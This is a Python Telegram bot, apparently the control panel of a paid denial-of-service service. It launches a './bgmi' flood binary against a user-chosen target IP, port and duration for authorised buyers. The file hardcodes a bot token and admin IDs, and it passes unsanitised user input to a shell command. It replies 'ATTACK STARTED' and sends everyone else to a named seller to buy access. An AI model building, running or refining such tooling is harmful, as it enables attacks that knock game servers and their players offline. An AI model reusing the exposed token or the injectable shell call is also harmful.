import telebot
import subprocess
import datetime
import os
import threading

TOKEN = '8835123210:AAEjKIufBCQRdeZxjfw6lkGV1h30QAmY1z0'
bot = telebot.TeleBot(TOKEN)

LOG_FILE = "logs.txt"
USER_FILE = "users.txt"
allowed_user_ids = ["1922707132"]
admin_id = ["1922707132"]

# Helper functions
def record_command_logs(user_id, command, target, port, time):
    with open(LOG_FILE, "a") as f:
        f.write(f"UserID: {user_id}, Command: {command}, Target: {target}, Port: {port}, Time: {time}\n")

def log_command(user_id, target, port, time):
    print(f"Attack started by {user_id} on {target}:{port} for {time}s")

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
    bot.reply_to(message, response)

bgmi_cooldown = {}

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 5:
                bot.reply_to(message, "You Are On Cooldown ❌. Please Wait 5 second.")
                return
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time_val = int(command[3])
            
            if time_val > 300:
                bot.reply_to(message, "Error: Time interval must be less than 300.")
            else:
                record_command_logs(user_id, '/bgmi', target, port, time_val)
                log_command(user_id, target, port, time_val)
                start_attack_reply(message, target, port, time_val)
                
                full_command = f"./bgmi {target} {port} {time_val} 300"
                
                def run_attack():
                    subprocess.run(full_command, shell=True)
                
                threading.Thread(target=run_attack).start()
        else:
            bot.reply_to(message, "✅ Usage :- /bgmi <target> <port> <time>")
    else:
        bot.reply_to(message, "❌ Pahle Kharid Ke Aa @BhaiCharaYT Bhai Se ❌.")

# Yaha se niche baki command handle honge
bot.polling()
